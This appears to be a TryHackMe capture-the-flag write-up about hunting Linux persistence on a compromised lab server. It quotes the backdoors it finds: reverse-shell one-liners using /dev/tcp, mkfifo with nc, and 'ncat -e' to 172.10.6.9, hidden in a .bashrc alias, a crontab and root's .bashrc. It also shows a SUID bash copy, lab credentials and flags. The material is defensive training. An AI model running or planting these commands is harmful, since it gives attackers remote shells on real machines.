----
Can you find all the basic persistence mechanisms in this Linux endpoint?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/5a8e7a7a02d75283f411004a07e7bfc6.png)

###  Connect to the machine via SSH

 Start Machine

A server has been compromised, and the security team has decided to isolate the machine until it's been thoroughly cleaned up. Initial checks by the Incident Response team revealed that there are five different backdoors. It's your job to find and remediate them before giving the signal to bring the server back to production.

First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection.  

To start our investigation, we need to connect to the server. The IR team has provided the credentials for use below and noted that the user has root privileges to the server. I'll help guide you along at first, but as we progress through each step, I'm sure you'll feel more comfortable solving these on your own.

user: giorgio

password: armani

Answer the questions below

What is the server's OS version?

```
──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa giorgio@10.10.36.233 
The authenticity of host '10.10.36.233 (10.10.36.233)' can't be established.
ED25519 key fingerprint is SHA256:4glYNyZQWXUC3BKPPG5+org2lgDBBCdqSFt9gVuKl3Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.36.233' (ED25519) to the list of known hosts.
giorgio@10.10.36.233's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 May 2023 04:12:02 PM UTC

  System load:  0.12              Processes:             149
  Usage of /:   46.1% of 9.78GB   Users logged in:       0
  Memory usage: 6%                IPv4 address for eth0: 10.10.36.233
  Swap usage:   0%


23 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Apr 13 19:27:30 2022 from 192.168.159.128
giorgio@giorgio:~$ id
uid=1000(giorgio) gid=1000(giorgio) groups=1000(giorgio),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
giorgio@giorgio:~$ ls
giorgio@giorgio:~$ ls -lah
total 1.2M
drwxr-xr-x 4 giorgio giorgio 4.0K Apr 13  2022 .
drwxr-xr-x 3 root    root    4.0K Apr 13  2022 ..
-rwsr-xr-x 1 root    root    1.2M Apr 13  2022 .bad_bash
-rw------- 1 giorgio giorgio    0 May  1 16:12 .bash_history
-rw-r--r-- 1 giorgio giorgio  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 giorgio giorgio 3.9K Apr 13  2022 .bashrc
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .cache
-rw-r--r-- 1 giorgio giorgio  807 Feb 25  2020 .profile
-rw-rw-r-- 1 giorgio giorgio   75 Apr 13  2022 .selected_editor
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .ssh
-rw-r--r-- 1 giorgio giorgio    0 Apr 13  2022 .sudo_as_admin_successful
-rw------- 1 giorgio giorgio 9.9K Apr 13  2022 .viminfo

giorgio@giorgio:/etc$ cat /etc/issue
Ubuntu 20.04.4 LTS 

giorgio@giorgio:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.4 LTS"

```

*Ubuntu 20.04.4 LTS*

### Investigating the giorgio account

Since we're in the giorgio account already, we might as well have a look around.

Answer the questions below

```
giorgio@giorgio:~$ ls -lah
total 1.2M
drwxr-xr-x 4 giorgio giorgio 4.0K Apr 13  2022 .
drwxr-xr-x 3 root    root    4.0K Apr 13  2022 ..
-rwsr-xr-x 1 root    root    1.2M Apr 13  2022 .bad_bash
-rw------- 1 giorgio giorgio    0 May  1 16:12 .bash_history
-rw-r--r-- 1 giorgio giorgio  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 giorgio giorgio 3.9K Apr 13  2022 .bashrc
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .cache
-rw-r--r-- 1 giorgio giorgio  807 Feb 25  2020 .profile
-rw-rw-r-- 1 giorgio giorgio   75 Apr 13  2022 .selected_editor
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .ssh
-rw-r--r-- 1 giorgio giorgio    0 Apr 13  2022 .sudo_as_admin_successful
-rw------- 1 giorgio giorgio 9.9K Apr 13  2022 .viminfo

giorgio@giorgio:~$ tac .bashrc
cat /dev/null > ~/.bash_history

fi
  fi
    . /etc/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  if [ -f /usr/share/bash-completion/bash_completion ]; then
if ! shopt -oq posix; then
# sources /etc/bash.bashrc).
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# enable programmable completion features (you don't need to enable

fi
    . ~/.bash_aliases
if [ -f ~/.bash_aliases ]; then

# See /usr/share/doc/bash-doc/examples in the bash-doc package.
# ~/.bash_aliases, instead of adding them here directly.
# You may want to put all your additions into a separate file like
# Alias definitions.

alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
#   sleep 10; alert
# Add an "alert" alias for long running commands.  Use like so:

alias ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
# some more ls aliases

giorgio@giorgio:~$ crontab -e
* * * * * /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f

```

What's the most interesting file you found in giorgio's home directory?  

Using the ls command on giorgio's home directory doesn't seem to return anything, so maybe we can find something interesting in the hidden files?

*.bad_bash*

In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later.

Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?

alias is a command that allows a string to be interpreted using a shorter, usually easier-to-remember "alias" for the string. Maybe there's a suspicious usage of alias somewhere?

*'(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --co lor=auto'*

It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.

Did you find anything interesting about scheduled tasks?

cron is a great way to automate recurring tasks. Maybe there's a suspicious usage of cron?

*/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f*

### Dirty Wordlist Revisited

In the previous task, the concept of a dirty wordlist was introduced. In this task, we will discuss it in more detail.

A dirty wordlist is essentially raw documentation of the investigation from the investigator's perspective. It may contain everything that would help lead the investigation forward, from actual IOCs to random notes. Keeping a dirty wordlist assures the investigator that a specific IOC has already been recorded, helping keep the investigation on track and preventing getting stuck in a closed loop of used leads. 

It also helps the investigator remember the mindset that they had during the course of the investigation. The importance of taking note of one's mindset during different points of an investigation is usually given less importance in favour of focusing on the more exciting atomic indicators; however, recording it provides further context on why a specific bit is recorded in the first place. This is how pivot points are decided and further leads, born and pursued.

The advantages of a dirty wordlist don't end here. A quick way to formally document findings at the end of the investigation is to clean them up. It is recommended to put in every sort of detail that may help during the course of the investigation. So, in the end, it would be easy to remove all the unneeded details and false leads, enrich actual IOCs, and establish points of emphasis. The flag for this task is: THM{d1rty_w0rdl1st}

Answer the questions below

This section is a bonus discussion on the importance of a dirty wordlist. Accept the extra point and happy hunting!

What is the flag?

*THM{d1rty_w0rdl1st}*


### Investigating the root account

Normal user accounts aren't the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account. 

Answer the questions below

```
giorgio@giorgio:~$ sudo su
[sudo] password for giorgio: 
root@giorgio:/home/giorgio# cd /root
root@giorgio:~# Ncat: TIMEOUT.

ls
snap
[1]+  Exit 1                  ncat -e /bin/bash 172.10.6.9 6969  (wd: /home/giorgio)
(wd now: ~)

```

A few moments after logging on to the root account, you find an error message in your terminal.

What does it say?

Come on, do you really need a hint?

*Ncat: TIMEOUT.*

After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.

What command was displayed?

*ncat -e /bin/bash 172.10.6.9 6969*

You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened."

Can you find out how the suspicious command has been implemented?

This file is essentially a file that executes whenever a user logs on, but more importantly, it executes whenever bash is started.

*.bashrc*


### Investigating the system

After checking the giorgio and the root accounts, it's essentially a free-for-all from here on, as finding more suspicious items depends on how well you know what's "normal" in the system.

Answer the questions below

```
root@giorgio:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:0:nobody:/nonexistent:/bin/bash
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
giorgio:x:1000:1000:giorgio:/home/giorgio:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
```

There's one more persistence mechanism in the system.

A good way to systematically dissect the system is to look for "usuals" and "unusuals". For example, you can check for commonly abused or unusual files and directories.

This specific persistence mechanism is directly tied to _something_ (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. What's its name?

What is the last persistence mechanism?

It's a usual user with an unusual characteristic

*nobody*

### Final Thoughts

Now that you've found the final persistence mechanism, it's time to clean up. The persistence mechanisms tackled in this room are common and straightforward; as such, the process of eradicating them is simple.

The first four persistence mechanisms can be remediated by simply removing the mechanism (e.g. delete the file, remove the commands). The last one, however, involves bringing back the "unusuals" to their "usual" state, which is a bit more complex as you intend for that particular user, file or process to function as before.

Answer the questions below

Finally, as you've already found the final persistence mechanism, there's value in going all the way through to the end.

The adversary left a golden nugget of "advise" somewhere.

What is the nugget?

```
root@giorgio:~# su nobody
nobody@giorgio:/home$ ls -lah /
total 2.0G
drwxr-xr-x  20 root   root 4.0K Apr 13  2022 .
drwxr-xr-x  20 root   root 4.0K Apr 13  2022 ..
lrwxrwxrwx   1 root   root    7 Feb 23  2022 bin -> usr/bin
drwxr-xr-x   4 root   root 4.0K Apr 13  2022 boot
drwxr-xr-x  19 root   root 3.9K May  1 16:09 dev
drwxr-xr-x  98 root   root 4.0K Apr 13  2022 etc
drwxr-xr-x   3 root   root 4.0K Apr 13  2022 home
lrwxrwxrwx   1 root   root    7 Feb 23  2022 lib -> usr/lib
lrwxrwxrwx   1 root   root    9 Feb 23  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root    9 Feb 23  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root   10 Feb 23  2022 libx32 -> usr/libx32
drwx------   2 root   root  16K Apr 13  2022 lost+found
drwxr-xr-x   2 root   root 4.0K Feb 23  2022 media
drwxr-xr-x   2 root   root 4.0K Feb 23  2022 mnt
drwxr-xr-x   3 nobody root 4.0K Apr 13  2022 nonexistent
drwxr-xr-x   2 root   root 4.0K Feb 23  2022 opt
dr-xr-xr-x 181 root   root    0 May  1 16:08 proc
drwx------   4 root   root 4.0K Apr 13  2022 root
drwxr-xr-x  27 root   root  820 May  1 16:12 run
lrwxrwxrwx   1 root   root    8 Feb 23  2022 sbin -> usr/sbin
drwxr-xr-x   6 root   root 4.0K Feb 23  2022 snap
drwxr-xr-x   2 root   root 4.0K Feb 23  2022 srv
-rw-------   1 root   root 2.0G Apr 13  2022 swap.img
dr-xr-xr-x  13 root   root    0 May  1 16:08 sys
drwxrwxrwt  11 root   root 4.0K May  1 16:57 tmp
drwxr-xr-x  14 root   root 4.0K Feb 23  2022 usr
drwxr-xr-x  13 root   root 4.0K Feb 23  2022 var

nobody@giorgio:/home$ cd ../nonexistent/
nobody@giorgio:~$ ls -lah
total 24K
drwxr-xr-x  3 nobody root 4.0K Apr 13  2022 .
drwxr-xr-x 20 root   root 4.0K Apr 13  2022 ..
-rw-------  1 nobody root  127 Apr 13  2022 .bash_history
drwx------  2 nobody root 4.0K Apr 13  2022 .cache
-rw-------  1 nobody root  747 Apr 13  2022 .viminfo
-rw-r--r--  1 nobody root   20 Apr 13  2022 .youfoundme
nobody@giorgio:~$ cat .youfoundme 
THM{Nob0dy_1s_s@f3}

nobody@giorgio:/home/giorgio$ ./.bad_bash 
.bad_bash-5.0$ whoami
nobody

iorgio@giorgio:~$ rm .bad_bash 
rm: remove write-protected regular file '.bad_bash'? yes
giorgio@giorgio:~$ ls -lah
total 44K
drwxr-xr-x 4 giorgio giorgio 4.0K May  1 17:04 .
drwxr-xr-x 3 root    root    4.0K Apr 13  2022 ..
-rw------- 1 giorgio giorgio    0 May  1 17:04 .bash_history
-rw-r--r-- 1 giorgio giorgio  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 giorgio giorgio 3.9K Apr 13  2022 .bashrc
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .cache
-rw-r--r-- 1 giorgio giorgio  807 Feb 25  2020 .profile
-rw-rw-r-- 1 giorgio giorgio   75 Apr 13  2022 .selected_editor
drwx------ 2 giorgio giorgio 4.0K Apr 13  2022 .ssh
-rw-r--r-- 1 giorgio giorgio    0 Apr 13  2022 .sudo_as_admin_successful
-rw------- 1 giorgio giorgio 9.5K May  1 16:43 .viminfo

giorgio@giorgio:~$ nano .bashrc 
giorgio@giorgio:~$ cat .bashrc

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

giorgio@giorgio:~$ crontab -e
crontab: installing new crontab
# m h  dom mon dow   command
:wq!

```

These hackers seem to like playing "hide the nugget"... Make sure to double check your working directory!

*THM{Nob0dy_1s_s@f3}*


[[Unattended]]